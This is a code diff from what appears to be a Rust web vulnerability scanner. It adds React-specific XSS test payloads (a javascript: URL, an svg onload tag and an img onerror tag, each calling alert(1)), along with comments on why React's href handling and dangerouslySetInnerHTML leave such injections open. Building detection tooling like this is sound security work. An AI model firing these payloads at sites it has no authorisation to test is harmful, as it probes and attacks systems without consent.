@@ -494,9 +494,36 @@ pub fn get_tech_specific_payloads(techs: &TechDetectionResult) -> Vec<String> {
                     class_marker
                 ));
             }
+            TechType::React => {
+                // React escapes text content by default. The XSS surface
+                // is concentrated in two patterns:
+                //   1. `<a href={userInput}>` — React still renders
+                //      `javascript:` URLs (a runtime warning since 16.9
+                //      but no actual sanitization). Hit href / iframe
+                //      src / form action contexts via the protocol
+                //      payload.
+                //   2. `dangerouslySetInnerHTML={{__html: userInput}}` —
+                //      maps to `innerHTML`, so `<svg onload>` /
+                //      `<img onerror>` payloads execute. Server-side
+                //      rendering puts the resulting HTML straight into
+                //      the response, so a generic HTML payload also
+                //      works; the `class={}` marker here lets us
+                //      attribute the finding to the React-aware path.
+                payloads.push(format!(
+                    "javascript:alert(1)/*{}*/",
+                    class_marker
+                ));
+                payloads.push(format!(
+                    "<svg onload=alert(1) class={}></svg>",
+                    class_marker
+                ));
+                payloads.push(format!(
+                    "<img src=x onerror=alert(1) class={}>",
+                    class_marker
+                ));
+            }
             // Server-side techs: no specific client-side payloads needed
-            TechType::React
-            | TechType::Svelte
+            TechType::Svelte
             | TechType::Backbone
             | TechType::ASPNet
             | TechType::PHP
